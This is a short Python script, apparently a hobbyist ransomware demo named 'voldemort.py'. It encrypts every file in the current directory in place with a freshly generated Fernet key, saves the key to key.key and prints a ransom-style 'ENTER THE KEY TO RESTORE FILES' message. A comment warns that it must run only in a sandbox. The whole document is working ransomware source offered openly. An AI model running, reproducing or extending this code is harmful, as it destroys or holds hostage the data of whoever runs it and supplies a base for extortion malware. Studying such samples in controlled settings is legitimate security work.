# DO NOT RUN OUTSIDE OF A CONTROLLED SANDBOX, IT WILL CORRUPT EVERYTHING IN THE CURRENT DIRECTORY
import os
from cryptography.fernet import Fernet
# A file that will encrypt all files in a folder

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)


key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("ENTER THE KEY TO RESTORE FILES")
